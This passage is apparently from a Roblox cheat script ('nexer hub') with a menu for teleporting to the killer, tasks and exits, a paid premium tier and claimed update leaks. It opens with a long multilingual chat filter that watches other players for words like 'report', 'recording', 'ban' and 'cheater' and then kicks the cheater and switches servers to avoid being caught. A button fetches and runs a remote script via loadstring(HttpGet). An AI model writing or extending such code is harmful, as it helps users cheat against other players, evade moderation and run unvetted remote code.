if v:lower():match("recording") or v:lower():match(" rec") or v:lower():match("record") or v:lower():match("discor") or v:lower():match(" disco") or v:lower():match(" disc") or v:lower():match("ticket") or v:lower():match("tickets") or v:lower():match(" ds") or v:lower():match(" dc") or v:lower():match(" clip") or v:lower():match("proof") or v:lower():match("evidence") or v:lower():match("cheat") or v:lower():match("cheater") or v:lower():match("exploit") or v:lower():match("exploiter") or v:lower():match("slap farm") or v:lower():match("replica") or v:lower():match("slap farmer") or v:lower():match("replica cheater") or v:lower():match("читак") or v:lower():match("читер") or v:lower():match("читы") or v:lower():match("эксплоит") or v:lower():match("эксплоитер") or v:lower():match("реплика") or v:lower():match("top 1") or v:lower():match("топ 1") or v:lower():match("читаки") or v:lower():match("фарм шлепков") or v:lower():match("ЧИТЕР") or v:lower():match("ТУТ ЧИТЕР") or v:lower():match("ТУТ ЧИТАК") or v:lower():match("читерище") or v:lower():match("engañar") or v:lower():match("tramposo") or v:lower():match("tramposa")  or v:lower():match("explotar") or v:lower():match("explotador") or v:lower():match("granja de bofetadas") or v:lower():match("el primero") or v:lower():match("réplica") or v:lower():match("registro") or v:lower():match("grabación") or v:lower():match("boleto") or v:lower():match("ТУТ ЧИТАК") or v:lower():match("discordia") or v:lower():match("desct") or v:lower():match("grabar") or v:lower():match("ds") or v:lower():match("дс") or v:lower():match("дс le le le le") or v:lower():match("дискорд le le le le") or v:lower():match("дискор le le le le") or v:lower():match("снимаю") or v:lower():match("рекорд") or v:lower():match("снимать") or v:lower():match("бан") or v:lower():match("prohibición") or v:lower():match("ban") or v:lower():match("репорт") or v:lower():match("report") or v:lower():match("informe") or v:lower():match("骗子") or v:lower():match("欺骗") or v:lower():match("禁止") or v:lower():match("记录") or v:lower():match("记录") or v:lower():match("记录") or v:lower():match("开发") or v:lower():match("剥削者") or v:lower():match("复制品") or v:lower():match("顶部 1") or v:lower():match("顶部") or v:lower():match("不和谐") or v:lower():match("票") or v:lower():match("禁止") or v:lower():match("상위 1위") or v:lower():match("맨 위") or v:lower():match("사기꾼") or v:lower():match("속이다") or v:lower():match("악용하다") or v:lower():match("이용자") or v:lower():match("속이다") or v:lower():match("불화") or v:lower():match("표") or v:lower():match("레플리카") or v:lower():match("슬랩팜") or v:lower():match("기록") or v:lower():match("녹음") or v:lower():match("기록") or v:lower():match("보고서") then
game.Players.LocalPlayer:Kick("Possible Record Detected! Message: [ "..message.." ]")
wait(5)
ServerHop()
end
end
end
end)
end
end
game.Players.PlayerAdded:Connect(function(Player)
Player.Chatted:Connect(function(message)
BlacklistedWords = message:split(" ")
if _G.recordMAX == true then
for i, v in pairs(BlacklistedWords) do
if v:lower():match("recording") or v:lower():match(" rec") or v:lower():match("record") or v:lower():match("discor") or v:lower():match(" disco") or v:lower():match(" disc") or v:lower():match("ticket") or v:lower():match("tickets") or v:lower():match(" ds") or v:lower():match(" dc") or v:lower():match(" clip") or v:lower():match("proof") or v:lower():match("evidence") or v:lower():match("cheat") or v:lower():match("cheater") or v:lower():match("exploit") or v:lower():match("exploiter") or v:lower():match("slap farm") or v:lower():match("replica") or v:lower():match("slap farmer") or v:lower():match("replica cheater") or v:lower():match("читак") or v:lower():match("читер") or v:lower():match("читы") or v:lower():match("эксплоит") or v:lower():match("эксплоитер") or v:lower():match("реплика") or v:lower():match("top 1") or v:lower():match("топ 1") or v:lower():match("читаки") or v:lower():match("фарм шлепков") or v:lower():match("ЧИТЕР") or v:lower():match("ТУТ ЧИТЕР") or v:lower():match("ТУТ ЧИТАК") or v:lower():match("читерище") or v:lower():match("engañar") or v:lower():match("tramposo") or v:lower():match("tramposa")  or v:lower():match("explotar") or v:lower():match("explotador") or v:lower():match("granja de bofetadas") or v:lower():match("el primero") or v:lower():match("réplica") or v:lower():match("registro") or v:lower():match("grabación") or v:lower():match("boleto") or v:lower():match("ТУТ ЧИТАК") or v:lower():match("discordia") or v:lower():match("desct") or v:lower():match("grabar") or v:lower():match("ds") or v:lower():match("дс") or v:lower():match("дс le le le le") or v:lower():match("дискорд le le le le") or v:lower():match("дискор le le le le") or v:lower():match("снимаю") or v:lower():match("рекорд") or v:lower():match("снимать") or v:lower():match("бан") or v:lower():match("prohibición") or v:lower():match("ban") or v:lower():match("репорт") or v:lower():match("report") or v:lower():match("informe") or v:lower():match("骗子") or v:lower():match("欺骗") or v:lower():match("禁止") or v:lower():match("记录") or v:lower():match("记录") or v:lower():match("记录") or v:lower():match("开发") or v:lower():match("剥削者") or v:lower():match("复制品") or v:lower():match("顶部 1") or v:lower():match("顶部") or v:lower():match("不和谐") or v:lower():match("票") or v:lower():match("禁止") or v:lower():match("상위 1위") or v:lower():match("맨 위") or v:lower():match("사기꾼") or v:lower():match("속이다") or v:lower():match("악용하다") or v:lower():match("이용자") or v:lower():match("속이다") or v:lower():match("불화") or v:lower():match("표") or v:lower():match("레플리카") or v:lower():match("슬랩팜") or v:lower():match("기록") or v:lower():match("녹음") or v:lower():match("기록") or v:lower():match("보고서") or v:lower():match("enregistrer") or v:lower():match("enregistrement") or v:lower():match("ferme de gifles") or v:lower():match("interdire") or v:lower():match("rapport") or v:lower():match("haut 1") or v:lower():match("haut") or v:lower():match("réplique") or v:lower():match("billet") or v:lower():match("discorde") then
game.Players.LocalPlayer:Kick("Possible Record Detected! Message: [ "..message.." ]")
wait(5)
ServerHop()
end
end
end
end)
end)
end

-- 101530369600204 anti


-- loadstring(HttpGet:("124/552/1/5/7/125/4/7/2412/7/8/214/6/8/23/56/23/37/8/24523/57/9/2/53/61/5/78/8/43/7/999/54/54/32/3/4/5/66/666/2/332/1/24/567/268/32/8/235/235/"))()


-- btw thing above does nothing i just wrote random numbers lol

local Teleport = Window:MakeTab({
	Name = "Teleport",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Teleport:AddButton({
	Name = "Teleport To Lobby",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Lobby.SpawnLocation.CFrame
	    
	end
})

Teleport:AddButton({
	Name = "Teleport To Killer",
	Callback = function()

if game.Workspace:FindFirstChild("Map") then

for i,v in pairs(game.Workspace.Killers:GetDescendants()) do
if v.Name == "HumanoidRootPart" then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
else
OrionLib:MakeNotification({Name = "Error",Content = "Killer Not Found.",Image = "rbxassetid://4483345998",Time = 5})
end
end

else

OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})
end
    
	end
})

Teleport:AddButton({
	Name = "Teleport To Killer Spawn",
	Callback = function()

if game.Workspace:FindFirstChild("Map") then

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Map.Killerspawns.Spawn.CFrame

else

OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})

end
    
	end
})

Teleport:AddButton({
	Name = "Teleport To Survivor Spawn",
	Callback = function()

if game.Workspace:FindFirstChild("Map") then

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Map.Survivorspawns.Spawn.CFrame

else

OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})

end
    
	end
})

Teleport:AddButton({
	Name = "Teleport To Task",
	Callback = function()

if game.Workspace:FindFirstChild("Map") then

for i,v in pairs(game.Workspace.Map.Tasks.Current:GetChildren()) do
if v:FindFirstChild("Hitbox") then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Hitbox.CFrame
else
OrionLib:MakeNotification({Name = "Error",Content = "No Tasks Found.",Image = "rbxassetid://4483345998",Time = 5})
end
end

else

OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})

end
    
	end
})

Teleport:AddButton({
	Name = "Teleport To Exit",
	Callback = function()

if game.Workspace:FindFirstChild("Map") then

for i,v in pairs(game.Workspace.Exits:GetDescendants()) do
if v.ClassName == "Part" then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
else
OrionLib:MakeNotification({Name = "Error",Content = "No Exits Found.",Image = "rbxassetid://4483345998",Time = 5})
end
end

else

OrionLib:MakeNotification({Name = "Error",Content = "Match didn't started.",Image = "rbxassetid://4483345998",Time = 5})

end
    
	end
})

local Premium = Window:MakeTab({
	Name = "Premium",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Premium:AddParagraph("Price","Premium cost 20 robux.")

Premium:AddParagraph("Insctruction","After buying premium, re-execute script.")

Premium:AddButton({
	Name = "Buy Premium",
	Callback = function()

if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,1030264379) then
    OrionLib:MakeNotification({Name = "Error",Content = "Arleady Own Gamepass!",Image = "rbxassetid://4483345998",Time = 5})
else
    setclipboard(tostring("https://www.roblox.com/game-pass/1030264379"))
    OrionLib:MakeNotification({Name = "Error",Content = "Copied Gamepass Link!",Image = "rbxassetid://4483345998",Time = 5})
end
	    
	end
})

Premium:AddParagraph("About Premium","After buying this gamepass, you will get access to all premium features in nexer hub - the robloxia: until dawn. NOTICE! You won't get premium on your other alt accounts, only account where you bought gamepass from will be whitelisted.")

Premium:AddButton({
	Name = "Check if whitelisted",
	Callback = function()
	    
if _G.Premium == true then
OrionLib:MakeNotification({Name = "Error",Content = "You are whitelisted!",Image = "rbxassetid://4483345998",Time = 5})
else
    OrionLib:MakeNotification({Name = "Error",Content = "You aren't whitelisted!",Image = "rbxassetid://4483345998",Time = 5})
end

	 end
})   

local Leak = Window:MakeTab({
	Name = "New Update Leaks",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
 
Leak:AddParagraph("These Leaks Found In Game Files","Enjoy.")
Leak:AddParagraph("New Gamemode","New Gamemode: Bossfight.")
Leak:AddParagraph("Boss","Bossfight: All Players vs Roblox")
Leak:AddParagraph("New Maps","New/Old Possible Maps: 1. Snowcrane 2. Snowy Stronghold 3. Haunted Mansion 4. HQ 5. The Ruins 6. Crossroads V2")
Leak:AddParagraph("New Traps","New Possible Traps: 1. Subspace tripmine 2. Bomb")
Leak:AddParagraph("New Killers","New Possible Killers: 1. Tubers (back) 2. Sawnoob (back)")
Leak:AddParagraph("New Survivors","New Possible Survivors: 1. Noob 2. Roblox")

local Other = Window:MakeTab({
	Name = "Other",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Other:AddParagraph("Credits","Script By Nexer1234")

Other:AddButton({

	Name = "Force Reset { OVERRIDE! }",

	Callback = function()
	    

game.Players.LocalPlayer.Character.Humanoid.Health = 0

	 end
})  

Other:AddButton({
	Name = "Enable Reset",
	Callback = function()
	    

while task.wait(.1) do
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Reset_disabler") then
game.Players.LocalPlayer.PlayerGui["Reset_disabler"]:Destroy()
end
end

	 end
})  




Other:AddButton({
	Name = "Close Hub",
	Callback = function()
	    
OrionLib:Destroy()

	 end
})   

Other:AddButton({
	Name = "Infinity Yield",
	Callback = function()
	    
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()

	 end
})   

Other:AddButton({
	Name = "Fix Cam",
	Callback = function()
	    
OrionLib:MakeNotification({Name = "Error",Content = "Execute Infinity Yield and Execute Command ''fixcam''",Image = "rbxassetid://4483345998",Time = 5})

	 end
})   